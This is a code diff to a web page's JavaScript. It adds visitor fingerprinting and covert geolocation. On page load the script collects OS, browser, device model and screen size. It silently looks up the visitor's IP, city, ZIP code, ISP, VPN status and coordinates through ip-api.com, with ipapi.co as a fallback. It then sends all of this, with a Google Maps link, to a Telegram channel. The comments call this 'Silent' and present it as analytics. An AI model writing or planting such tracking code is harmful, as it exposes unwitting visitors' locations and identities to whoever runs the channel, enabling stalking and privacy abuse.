@@ -18,31 +18,101 @@ function sendTelegramLog(message) {
     }).catch(err => console.log("Analytics error")); // Silent fail
 }
 
+// --- Device & Browser Detection ---
+function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || '';
+    const screenW = screen.width;
+    const screenH = screen.height;
+    
+    // Detect OS
+    let os = "Unknown OS";
+    if (/iPhone/.test(ua)) os = "iPhone (iOS)";
+    else if (/iPad/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) os = "iPad (iPadOS)";
+    else if (/iPod/.test(ua)) os = "iPod (iOS)";
+    else if (/Android/.test(ua)) {
+        const androidVer = ua.match(/Android\s([\d.]+)/);
+        os = `Android${androidVer ? ' ' + androidVer[1] : ''}`;
+    }
+    else if (/Macintosh/.test(ua)) os = "macOS";
+    else if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
+    else if (/Windows/.test(ua)) os = "Windows";
+    else if (/Linux/.test(ua)) os = "Linux";
+    
+    // Detect Browser
+    let browser = "Unknown Browser";
+    if (/CriOS/.test(ua)) browser = "Chrome (iOS)";
+    else if (/FxiOS/.test(ua)) browser = "Firefox (iOS)";
+    else if (/EdgiOS/.test(ua)) browser = "Edge (iOS)";
+    else if (/OPiOS/.test(ua)) browser = "Opera (iOS)";
+    else if (/Edg\//.test(ua)) browser = "Microsoft Edge";
+    else if (/OPR\//.test(ua)) browser = "Opera";
+    else if (/SamsungBrowser/.test(ua)) browser = "Samsung Internet";
+    else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = "Google Chrome";
+    else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+    else if (/Firefox\//.test(ua)) browser = "Firefox";
+    
+    // Detect device model from Android UA
+    let deviceModel = "";
+    if (/Android/.test(ua)) {
+        const modelMatch = ua.match(/;\s*([^;)]+)\s*Build\//);
+        if (modelMatch) deviceModel = modelMatch[1].trim();
+    }
+    
+    return {
+        os,
+        browser,
+        deviceModel,
+        screen: `${screenW}x${screenH}`,
+        fullUA: ua
+    };
+}
+
 // Log initial visit and location
 window.addEventListener('load', () => {
-    const ua = navigator.userAgent;
-    let device = "Unknown Device";
-    if (/iPhone|iPad|iPod/.test(ua)) device = "iOS Device";
-    else if (/Android/.test(ua)) device = "Android Device";
-    else if (/Macintosh/.test(ua)) device = "Mac";
-    else if (/Windows/.test(ua)) device = "Windows PC";
+    const info = getDeviceInfo();
     
-    sendTelegramLog(`📩 *New Visitor!*\nDevice: ${device}\nTime: ${new Date().toLocaleTimeString()}`);
+    let deviceLine = `📱 OS: ${info.os}`;
+    if (info.deviceModel) deviceLine += ` (${info.deviceModel})`;
+    
+    const visitMsg = [
+        `📩 *New Visitor!*`,
+        deviceLine,
+        `🌐 Browser: ${info.browser}`,
+        `📐 Screen: ${info.screen}`,
+        `🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+    ].join('\n');
+    
+    sendTelegramLog(visitMsg);
 
-    // Silent IP Location Tracking
-    fetch('https://ipapi.co/json/')
+    // Silent IP-based Location (using ip-api.com - more reliable, no key needed)
+    fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,mobile,proxy,query')
         .then(response => response.json())
         .then(data => {
-            const ip = data.ip || "Unknown IP";
-            const city = data.city || "Unknown City";
-            const region = data.region || "Unknown Region";
-            const country = data.country_name || "Unknown Country";
-            const isp = data.org || "Unknown ISP";
-            
-            sendTelegramLog(`📍 *Silent Location Received!*\nDevice: ${device}\nIP: ${ip}\nLocation: ${city}, ${region}, ${country}\nISP: ${isp}`);
+            if (data.status === 'success') {
+                const locMsg = [
+                    `📍 *Location Detected!*`,
+                    `🌐 IP: ${data.query}`,
+                    `📌 City: ${data.city}, ${data.regionName}`,
+                    `🏳️ Country: ${data.country}`,
+                    `📮 ZIP: ${data.zip || 'N/A'}`,
+                    `📶 ISP: ${data.isp}`,
+                    `📡 Org: ${data.org}`,
+                    `📱 Mobile Network: ${data.mobile ? 'Yes' : 'No'}`,
+                    `🔒 VPN/Proxy: ${data.proxy ? 'Yes' : 'No'}`,
+                    `🗺️ Map: https://www.google.com/maps?q=${data.lat},${data.lon}`
+                ].join('\n');
+                sendTelegramLog(locMsg);
+            }
         })
-        .catch(error => {
-            console.log("IP fetch failed");
+        .catch(() => {
+            // Fallback to ipapi.co if ip-api.com fails
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => {
+                    sendTelegramLog(`📍 *Location (Fallback)*\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country_name}\nISP: ${data.org}`);
+                })
+                .catch(() => console.log("All IP services failed"));
         });
 });
 
